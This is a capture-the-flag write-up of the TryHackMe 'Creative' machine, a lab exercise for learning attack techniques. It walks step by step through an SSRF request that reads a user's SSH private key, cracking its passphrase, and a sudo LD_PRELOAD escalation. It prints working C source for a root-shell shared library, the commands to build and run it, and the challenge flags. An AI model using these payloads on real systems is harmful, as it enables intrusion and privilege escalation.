# 🎨 TryHackMe — Creative

> **Web Enumeration | Virtual Host Discovery | SSRF | Local File Read | SSH Key Extraction | SSH Key Cracking | Linux Privilege Escalation | LD_PRELOAD**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square&labelColor=555555)
![OS](https://img.shields.io/badge/OS-Ubuntu-e95420?style=flat-square&labelColor=555555)
![Web](https://img.shields.io/badge/Web-nginx-009639?style=flat-square&labelColor=555555)
![Vulnerability](https://img.shields.io/badge/Vulnerability-SSRF%20%7C%20LD_PRELOAD-e63946?style=flat-square&labelColor=555555)

---

## 📋 Overview

**Creative** is a TryHackMe Linux machine that demonstrates a complete attack chain beginning with web enumeration and ending with root access.

The machine exposes a web application running on nginx. During enumeration, a virtual host named `beta.creative.thm` was discovered.

The beta application contained a URL testing functionality that was vulnerable to **Server-Side Request Forgery (SSRF)**. This allowed access to internal services that were not directly exposed externally. Using the SSRF functionality, the internal web server was accessed and an SSH private key was retrieved from the `saad` user's home directory.

The SSH key was then cracked using `John the Ripper`, allowing SSH access as `saad`.

For privilege escalation, the user's `sudo` permissions revealed that `/usr/bin/ping` could be executed as root while preserving the `LD_PRELOAD` environment variable.

A malicious shared library was created and loaded through `LD_PRELOAD`, resulting in a root shell.

---

# 🎯 Objectives

- Enumerate the target
- Identify exposed services
- Configure the target hostname
- Perform web directory enumeration
- Discover virtual hosts
- Identify the `beta.creative.thm` application
- Analyze the URL testing functionality
- Exploit SSRF
- Access internal services
- Read the user's SSH private key
- Crack the SSH key passphrase
- Obtain SSH access as `saad`
- Retrieve the user flag
- Enumerate sudo permissions
- Identify an `LD_PRELOAD` privilege-escalation path
- Create a malicious shared library
- Execute it through `sudo`
- Obtain a root shell
- Retrieve the root flag

---

# 🔎 1. Initial Enumeration

I started with an Nmap service and version scan:

```bash
nmap -sV -sC 10.48.167.77
```
The scan identified two open ports:
```
22/tcp   open   ssh
80/tcp   open   http
```
SSH was running:
```
OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
```
The HTTP service was:
```
nginx 1.18.0 (Ubuntu)
```
Nmap also reported the HTTP title:
```
Creative
```
and indicated that the web server did not redirect directly to:
```
http://creative.thm
```

<img width="826" height="340" alt="1" src="https://github.com/user-attachments/assets/781e6627-da9e-4407-98ab-63ab6656f8ee" />

---

# 🌐 2. Configuring the Hostname

The web application expected the hostname:
```
creative.thm
```
I added the target IP and hostname to ```/etc/hosts```:
```
sudo nano /etc/hosts
```
Entry:
```
10.48.167.77    creative.thm
```
This allowed the application to be accessed using:
```
http://creative.thm
```
instead of directly using the IP address.

<img width="633" height="260" alt="2" src="https://github.com/user-attachments/assets/2738a729-b31b-4a6d-a129-408960004d2d" />

<img width="1002" height="471" alt="3" src="https://github.com/user-attachments/assets/db86f38f-76f1-422f-9e89-f2ec0578952d" />

---

# 🕵️ 3. Web Enumeration

I performed directory enumeration using Gobuster:
```
gobuster dir -u http://creative.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
The scan identified:
```
/assets/    Status: 301
```
I also checked the ```/assets/``` directory.

The server returned:
```
403 Forbidden
```
Although directory listing was forbidden, this confirmed that ```/assets/``` existed.

<img width="932" height="315" alt="4" src="https://github.com/user-attachments/assets/f0af8165-fc34-4910-a9ca-a96539f6b2fd" />

<img width="825" height="322" alt="4-1" src="https://github.com/user-attachments/assets/1d3015f6-3d85-4633-90b9-2ddf45216a8b" />

---

# 🔍 4. Virtual Host Enumeration

Since the main website did not reveal an obvious attack path, I investigated possible virtual hosts.

I used Gobuster's VHost enumeration mode:
```
gobuster vhost -u http://creative.thm/ -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top10000.txt --append-domain
```
A virtual host was discovered:
```
beta.creative.thm
```
The response was:
```
Status: 200
```
I added the new hostname to ```/etc/hosts```:
```
10.48.167.77    creative.thm
10.48.167.77    beta.creative.thm
```

<img width="1208" height="318" alt="4-2" src="https://github.com/user-attachments/assets/f956a7cc-bd57-4366-93ec-a4b57ee4d664" />
<img width="736" height="245" alt="5" src="https://github.com/user-attachments/assets/08754110-b509-452a-a832-48c9e6adeaa6" />

---

# 🧪 5. Beta Application

I visited:
```
http://beta.creative.thm
```
The page was titled:
```
Beta URL Tester
```
The application provided a URL input field with the functionality:
```
Enter a URL and test whether it is alive.
```
This functionality was interesting because the server itself appeared to be making requests to URLs supplied by the user.

This is a common situation where **SSRF** should be investigated.

<img width="1180" height="421" alt="6" src="https://github.com/user-attachments/assets/91940516-bac5-45be-8edf-72c1484c5da2" />

---

# 🚨 6. Testing for SSRF

The application accepted a URL parameter:
```
url=
```
I tested whether the server could access localhost.

<img width="1246" height="514" alt="7-1" src="https://github.com/user-attachments/assets/0a142f26-cbd6-45d1-96c8-b86942e5b827" />

The request was sent using Burp Suite.

Example request:
```
POST / HTTP/1.1
Host: beta.creative.thm
Content-Type: application/x-www-form-urlencoded

url=http%3A%2F%2F127.0.0.1%3A1337%2Fhome
```
The URL was:
```
http://127.0.0.1:1337/home
```
The important point is that the request was processed by the target server, not directly by my browser.

<img width="1155" height="716" alt="8" src="https://github.com/user-attachments/assets/0097978a-740e-4b8b-856e-ccc523b9203d" />

---

# 🧠 7. Understanding the SSRF

The application was effectively performing:
```
User
 │
 │ URL supplied
 ▼
Beta URL Tester
 │
 │ Server-side request
 ▼
127.0.0.1
 │
 ▼
Internal Service
```
Normally, an external attacker cannot directly access services bound to the target's localhost interface.

However, the vulnerable URL tester could make the request from the server itself.

This is the essence of **Server-Side Request Forgery (SSRF)**.

---

# 🔎 8. Discovering the Internal Service

I used the SSRF functionality to test localhost ports.

A request to:
```
127.0.0.1:1337
```
returned an internal directory listing.

The response revealed:
```
Directory listing for /home/
```
and contained:
```
saad/
ubuntu/
```
This confirmed that the SSRF could access internal resources.

---

# 🔐 9. Reading the SSH Private Key

The internal service allowed paths to be requested through the SSRF.

I requested:
```
http://127.0.0.1:1337/home/saad/.ssh/id_rsa
```
The response contained an OpenSSH private key:
```
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

<img width="1253" height="584" alt="9" src="https://github.com/user-attachments/assets/70fddead-8e9b-497a-b06b-6a830769ca22" />

I copied the private key into a local file:
```
nano id_rsa
```
Then secured its permissions:
```
chmod 600 id_rsa
```

<img width="444" height="102" alt="10" src="https://github.com/user-attachments/assets/1a63089d-33e1-4c32-ac5d-e40ebf1c5c75" />

---

# 🔑 10. Cracking the SSH Key Passphrase

The private key was protected by a passphrase.

I first converted the key into a format that John the Ripper could process:
```
ssh2john id_rsa > hash
```
Then I used the rockyou.txt wordlist:
```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
John successfully recovered the passphrase:
```
sweetness
```

<img width="760" height="303" alt="11" src="https://github.com/user-attachments/assets/b2579b1d-a455-4d1c-9230-b9265762cad6" />

---

# 🖥️ 11. SSH Access as saad

I used the recovered private key to connect to the target:
```
ssh -i id_rsa saad@10.48.167.77
```
When prompted for the passphrase, I entered:
```
sweetness
```
The SSH login was successful.

The shell showed:
```
saad@ip-10-48-167-77:~$
```
I confirmed the current user:
```
id
```
Output:
```
uid=1000(saad) gid=1000(saad) groups=1000(saad)
```

<img width="756" height="706" alt="12" src="https://github.com/user-attachments/assets/6f132e0e-34ec-4d6e-94f9-b4169098ea9e" />

---

# 🚩 12. User Flag

I listed the contents of the home directory:
```
ls
```
The user.txt file was present.

I read it using:
```
cat user.txt
```
The user flag was:
```
9a1ce90a7653d74ab98630b47b8b4a84
```

---

# 📜 13. Checking Bash History

I inspected the user's shell history:
```
cat .bash_history
```
The history contained several interesting commands, including:
```
sudo -l
```
and a password stored in a command:
```
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
```
It also showed commands involving:
```
mysql
sudo
whoami
```
This demonstrates why shell history can be valuable during post-exploitation enumeration.

<img width="666" height="594" alt="13" src="https://github.com/user-attachments/assets/e9af2a04-87b7-4cb0-a488-0b8f4aa03e5d" />

---

# 🔐 14. Sudo Enumeration

I checked the commands available through sudo:
```
sudo -l
```
The important output was:
```
User saad may run the following commands:

(root) /usr/bin/ping
```
There was also an important environment configuration:
```
env_keep += LD_PRELOAD
```
This was the key privilege-escalation finding.

<img width="1146" height="130" alt="14" src="https://github.com/user-attachments/assets/5cc1e578-3955-4742-8113-84ec3f58cb02" />

---

# 💡 15. Understanding LD_PRELOAD

```LD_PRELOAD``` is an environment variable used by the Linux dynamic linker.

It can force a program to load a specified shared library before other libraries.

Normally, this is useful for legitimate purposes such as:
```
Testing
Debugging
Library overriding
Application instrumentation
```
However, if a user can:
```
1. Run a program as root
2. Preserve LD_PRELOAD
```
they may be able to force that root process to load attacker-controlled code.

The attack chain becomes:
```
saad
  ↓
sudo /usr/bin/ping
  ↓
LD_PRELOAD preserved
  ↓
Malicious shared library
  ↓
Library loaded by root process
  ↓
Code executes as root
  ↓
Root shell
```

---

# 🧪 16. Creating the Malicious Shared Library

I created a C source file:
```
nano exploit.c
```
The library used a constructor function that executes automatically when the shared object is loaded.
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void inject() __attribute__((constructor));

void inject() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```
The constructor performs the following actions:
```
unsetenv("LD_PRELOAD")
        ↓
  setuid(0)
        ↓
  setgid(0)
        ↓
  /bin/bash
```
The uploaded exploit source follows this same constructor-based technique.

---

# ⚙️ 17. Compiling the Shared Object

I compiled the source code as a shared library:
```
gcc -fPIC -shared -o exploit.so exploit.c
```
This generated:
```
exploit.so
```
The important compilation options are:
```
-fPIC
```
and:
```
-shared
```
```-fPIC``` creates position-independent code suitable for shared libraries.

---

# 🚀 18. Exploiting LD_PRELOAD

The sudo configuration allowed ```/usr/bin/ping``` to be executed as root.

I supplied the malicious library through ```LD_PRELOAD```:
```
sudo LD_PRELOAD=./exploit.so ping
```
The ```ping``` process loaded the malicious shared object.

Because the process was running with root privileges, the constructor executed with root privileges as well.

The constructor then launched:
```
/bin/bash
```

<img width="968" height="419" alt="15" src="https://github.com/user-attachments/assets/28364933-b1c9-462d-972e-59d3fe16eaa9" />

---

# 👑 19. Root Access

After exploitation, I checked my identity:
```
whoami
```
The shell returned:
```
root
```
I also confirmed the root environment:
```
id
```
The result showed UID 0.

This confirmed successful privilege escalation from:
```
saad
```
to:
```
root
```

---

# 🏆 20. Root Flag

I moved into the root directory:
```
cd /root
```
Then listed the contents:
```
ls
```
The root flag was present:
```
root.txt
```
I retrieved it:
```
cat root.txt
```
The root flag was:
```
992bfd94b90da48634aed182aae7b999f
```
